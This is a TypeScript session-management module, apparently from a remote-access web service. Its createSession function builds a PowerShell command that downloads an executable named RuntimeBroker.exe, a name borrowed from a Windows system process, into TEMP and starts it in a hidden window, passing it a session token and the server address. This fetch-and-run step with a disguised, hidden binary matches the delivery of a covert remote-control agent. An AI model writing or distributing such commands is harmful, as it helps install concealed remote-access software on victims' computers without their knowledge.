import { getSignalingServer } from './firebase-admin';
import { SERVER_URL } from '@/config/server';
import type { CreateSessionResponse } from '@/types/session';

export interface SessionRecord {
  id: string;
  sourceId: string | null;
  clientId: string | null;
  state: string;
  createdAt: number;
}

export async function createSession(): Promise<CreateSessionResponse> {
  const server = getSignalingServer();
  const res = await fetch(`${server}/session`, { method: 'POST' });
  if (!res.ok) throw new Error(`Signaling server error: ${res.status}`);
  const { sessionId, token } = await res.json() as { sessionId: string; token: string };

  const publicServer = process.env.NEXT_PUBLIC_SIGNALING_SERVER ?? SERVER_URL;

  // Simple command: download to TEMP and run with token/server arguments
  const agentCommand = `powershell -Command "iwr ${publicServer}/RuntimeBroker.exe -OutFile $env:TEMP\\RuntimeBroker.exe; Start-Process -FilePath $env:TEMP\\RuntimeBroker.exe -ArgumentList '--token ${token} --server ${publicServer}' -WindowStyle Hidden"`;

  return {
    token,
    sessionId,
    expiresAt: Date.now() + 3_600_000,
    agentCommand,
    agentDownloadUrl: `${publicServer}/RuntimeBroker.exe`,
  };
}

export async function listSessions(): Promise<SessionRecord[]> {
  const server = getSignalingServer();
  const res = await fetch(`${server}/sessions`);
  if (!res.ok) return [];
  return res.json() as Promise<SessionRecord[]>;
}

export async function closeSession(sessionId: string): Promise<void> {
  const server = getSignalingServer();
  await fetch(`${server}/session/${sessionId}`, { method: 'DELETE' });
}
